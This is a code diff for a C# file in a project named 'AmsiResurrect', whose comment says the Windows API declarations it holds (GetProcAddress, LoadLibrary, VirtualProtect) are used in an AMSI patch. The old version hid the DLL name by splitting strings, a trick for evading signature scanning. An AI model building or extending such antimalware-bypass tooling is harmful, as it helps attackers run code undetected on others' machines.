@@ -1,17 +1,24 @@
-﻿using System;
+using System;
 using System.Runtime.InteropServices;
 
-
-
-    public class Apis
+namespace AmsiResurrect
+{
+    /// <summary>
+    /// P/Invoke declarations for Windows API functions used in the AMSI patch.
+    /// </summary>
+    internal static class NativeMethods
     {
-        [DllImport("k"+ "e" + "rne" + "l32" + ".d" + "l" + "l")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procname);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        [DllImport("ker" + "ne" + "l32.dl" + "l")]
-        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr LoadLibrary(string lpFileName);
 
-        [DllImport("ker" + "nel" + "32" + ".d" + "ll")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpfOldPRotect);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool VirtualProtect(
+            IntPtr lpAddress,
+            UIntPtr dwSize,
+            uint flNewProtect,
+            out uint lpflOldProtect);
     }
-
+}
